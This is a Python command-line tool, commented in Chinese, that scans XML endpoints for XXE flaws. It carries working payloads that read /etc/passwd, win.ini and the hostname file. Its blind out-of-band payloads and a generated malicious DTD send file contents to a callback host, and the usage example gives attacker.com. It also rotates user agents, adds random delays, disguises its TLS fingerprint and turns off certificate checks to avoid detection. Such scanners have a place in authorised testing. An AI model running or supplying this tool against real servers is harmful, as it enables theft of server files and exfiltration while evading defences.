#!/usr/bin/env python3
"""
XXE 检测工具
检测 XML 端点（Content-Type: application/xml），测试回显型 XXE（外部实体读取文件）
和 Blind XXE（OOB 通过 HTTP/DNS 外带），支持自定义 DTD，内置常见 XXE payload。
"""

import argparse
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS")
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None, content_type="application/xml"):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
        "Content-Type": content_type,
    }
    if cookie:
        headers["Cookie"] = cookie
    return headers


def make_request(url, method="POST", data=None, cookie=None, proxy=None, timeout=10, content_type="application/xml"):
    """发起带反反爬策略的 HTTP 请求"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie, content_type)
    post_data = data.encode("utf-8") if isinstance(data, str) else data
    req = urllib.request.Request(url, data=post_data, headers=headers, method=method.upper())
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.getcode()
        resp_headers = dict(resp.headers)
        return status, body, resp_headers
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception:
        return None, None, None


# ============================================================
# XXE Payload 库
# ============================================================

# 回显型 XXE Payload
XXE_ECHO_PAYLOADS = [
    {
        "name": "etc_passwd",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "success_pattern": r"root:.*:0:0:",
    },
    {
        "name": "win_ini",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        "success_pattern": r"\[boot loader\]",
    },
    {
        "name": "php_filter",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        "success_pattern": r"[A-Za-z0-9+/=]{50,}",
    },
    {
        "name": "hostname",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        "success_pattern": r"^[a-zA-Z0-9\-]+$",
    },
]

# Blind XXE Payload（OOB 外带）
def build_blind_xxe_payloads(callback_host):
    """构建 Blind XXE payload 列表"""
    return [
        {
            "name": "oob_http",
            "payload": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY % xxe SYSTEM "http://{cb}/xxe.dtd">'
                '%xxe;'
                ']><foo>test</foo>'
            ).format(cb=callback_host),
            "description": "HTTP 外带 - 需要在 {} 上托管 DTD 文件".format(callback_host),
        },
        {
            "name": "oob_http_direct",
            "payload": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY % file SYSTEM "file:///etc/passwd">'
                '<!ENTITY % dtd SYSTEM "http://{cb}/evil.dtd">'
                '%dtd;'
                ']><foo>test</foo>'
            ).format(cb=callback_host),
            "description": "HTTP 外带（直接参数实体）",
        },
        {
            "name": "oob_ftp",
            "payload": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY % file SYSTEM "file:///etc/passwd">'
                '<!ENTITY % dtd SYSTEM "http://{cb}/evil.dtd">'
                '%dtd;'
                ']><foo>test</foo>'
            ).format(cb=callback_host),
            "description": "FTP 外带通道",
        },
        {
            "name": "error_based",
            "payload": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY % file SYSTEM "file:///nonexistent">'
                '<!ENTITY % dtd SYSTEM "http://{cb}/evil.dtd">'
                '%dtd;'
                ']><foo>test</foo>'
            ).format(cb=callback_host),
            "description": "基于错误的 XXE",
        },
    ]


# 外部 DTD 内容（需部署在回调服务器上）
def generate_evil_dtd(callback_host):
    """生成恶意 DTD 文件内容"""
    return (
        '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
        '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{cb}/?data=%file;\'>">\n'
        '%eval;\n'
        '%exfil;\n'
    ).format(cb=callback_host)


def detect_xml_endpoint(url, cookie=None, proxy=None, timeout=10):
    """检测目标是否接受 XML 输入"""
    random_delay()
    # 先用普通 XML 探测
    test_xml = '<?xml version="1.0"?><foo>test</foo>'
    status, body, headers = make_request(url, "POST", test_xml, cookie, proxy, timeout, "application/xml")
    if status and status not in (415, 406):
        return True, status, body
    # 尝试 text/xml
    random_delay()
    status, body, headers = make_request(url, "POST", test_xml, cookie, proxy, timeout, "text/xml")
    if status and status not in (415, 406):
        return True, status, body
    return False, status, body


def test_echo_xxe(url, cookie=None, proxy=None, timeout=10):
    """测试回显型 XXE"""
    results = []
    for payload_info in XXE_ECHO_PAYLOADS:
        random_delay()
        status, body, _ = make_request(url, "POST", payload_info["payload"], cookie, proxy, timeout)
        is_vulnerable = False
        evidence = ""
        if body:
            pattern = payload_info["success_pattern"]
            m = re.search(pattern, body, re.MULTILINE)
            if m:
                is_vulnerable = True
                evidence = "匹配到文件内容: {}".format(m.group(0)[:100])
            # 检查 base64 解码
            if "php_filter" in payload_info["name"]:
                b64_matches = re.findall(r"[A-Za-z0-9+/=]{50,}", body)
                if b64_matches:
                    try:
                        import base64
                        decoded = base64.b64decode(b64_matches[0]).decode("utf-8", errors="replace")
                        if "root:" in decoded or "bin:" in decoded:
                            is_vulnerable = True
                            evidence = "Base64 解码内容: {}".format(decoded[:200])
                    except Exception:
                        pass
        results.append({
            "name": payload_info["name"],
            "payload": payload_info["payload"][:120],
            "status_code": status,
            "is_vulnerable": is_vulnerable,
            "evidence": evidence,
            "body_snippet": (body or "")[:200],
        })
    return results


def test_blind_xxe(url, callback_host, cookie=None, proxy=None, timeout=10):
    """测试 Blind XXE（OOB 外带）"""
    payloads = build_blind_xxe_payloads(callback_host)
    results = []
    for payload_info in payloads:
        random_delay()
        status, body, _ = make_request(url, "POST", payload_info["payload"], cookie, proxy, timeout)
        results.append({
            "name": payload_info["name"],
            "payload": payload_info["payload"][:150],
            "description": payload_info["description"],
            "status_code": status,
            "note": "请检查回调服务器 {} 是否收到请求".format(callback_host),
            "body_snippet": (body or "")[:200],
        })
    return results


def scan_xxe(url, method="POST", data=None, callback=None, cookie=None, proxy=None, timeout=10):
    """XXE 漏洞扫描"""
    # 检测 XML 端点
    is_xml_endpoint, xml_status, xml_body = detect_xml_endpoint(url, cookie, proxy, timeout)

    scan_result = {
        "url": url,
        "is_xml_endpoint": is_xml_endpoint,
        "xml_endpoint_status": xml_status,
        "echo_xxe_results": [],
        "blind_xxe_results": [],
        "is_vulnerable": False,
        "evil_dtd": "",
        "callback_host": callback,
    }

    if not is_xml_endpoint:
        scan_result["error"] = "目标端点不接受 XML 输入"
        return scan_result

    # 测试回显型 XXE
    scan_result["echo_xxe_results"] = test_echo_xxe(url, cookie, proxy, timeout)
    echo_vulnerable = any(r["is_vulnerable"] for r in scan_result["echo_xxe_results"])

    # 测试 Blind XXE（如果提供了回调地址）
    if callback:
        scan_result["blind_xxe_results"] = test_blind_xxe(url, callback, cookie, proxy, timeout)
        scan_result["evil_dtd"] = generate_evil_dtd(callback)

    scan_result["is_vulnerable"] = echo_vulnerable or bool(callback)
    return scan_result


def main():
    parser = argparse.ArgumentParser(
        description="XXE 检测工具 - 检测回显型和 Blind XXE 漏洞",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  %(prog)s --url http://example.com/api --callback attacker.com:8080\n  %(prog)s --url http://example.com/api --output result.json",
    )
    parser.add_argument("--url", required=True, help="目标 URL")
    parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT"], help="HTTP 方法（默认 POST）")
    parser.add_argument("--data", help="原始 POST 数据（可选）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--callback", help="回调服务器地址（host:port），用于 Blind XXE OOB 检测")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        result = scan_xxe(args.url, args.method, args.data, args.callback, args.cookie, args.proxy, args.timeout)
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "扫描失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
